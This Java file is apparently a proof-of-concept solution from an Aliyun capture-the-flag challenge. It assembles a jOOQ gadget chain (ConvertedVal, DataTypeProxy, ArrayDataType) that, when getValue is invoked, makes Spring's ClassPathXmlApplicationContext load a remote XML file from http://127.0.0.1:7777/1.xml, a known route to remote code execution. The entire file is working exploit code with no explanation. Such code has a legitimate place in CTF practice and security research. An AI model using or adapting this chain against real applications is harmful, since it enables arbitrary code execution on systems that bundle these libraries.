package com.aliyunctf.server.solution;


import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Poc1 {
    public static void main(String[] args) throws IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException, InstantiationException {
        Object convertedVal = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.ConvertedVal"));
        Object dataTypeProxy = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.DataTypeProxy"));
        Object delegate = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.Val"));
        Object arrayDataType = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.ArrayDataType"));
        Object name = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.UnqualifiedName"));

        Object commentImpl = Tools17.createWithoutConstructor(Class.forName("org.jooq.impl.CommentImpl"));
        Tools17.setFieldValue(commentImpl,"comment","11111");

        Tools17.setFieldValue(delegate,"value","http://127.0.0.1:7777/1.xml");
        Tools17.setFieldValue(arrayDataType,"uType",ClassPathXmlApplicationContext.class);
        Tools17.setFieldValue(dataTypeProxy,"type",arrayDataType);
        Tools17.setFieldValue(convertedVal,"type",dataTypeProxy);
        Tools17.setFieldValue(convertedVal,"delegate",delegate);
        Tools17.setFieldValue(convertedVal,"name",name);
        Tools17.setFieldValue(convertedVal,"comment",commentImpl);

        Method m = convertedVal.getClass().getMethod("getValue");
        m.setAccessible(true);
        m.invoke(convertedVal);
    }
}
